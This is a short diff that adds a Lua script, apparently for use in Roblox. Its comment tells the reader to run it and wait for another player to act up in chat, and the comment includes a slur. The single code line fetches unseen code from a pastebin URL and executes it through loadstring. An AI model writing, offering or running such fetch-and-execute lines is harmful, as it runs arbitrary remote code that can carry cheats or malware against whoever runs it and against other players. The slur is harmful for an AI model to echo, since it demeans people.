@@ -1,0 +1,3 @@
+--[[ simply execute this script, and wait for someone ingame to act retarded in chat and you'll see the rest...
+]]
+loadstring(game:HttpGet("https://pastebin.com/raw/GKAVpCWw", true))()
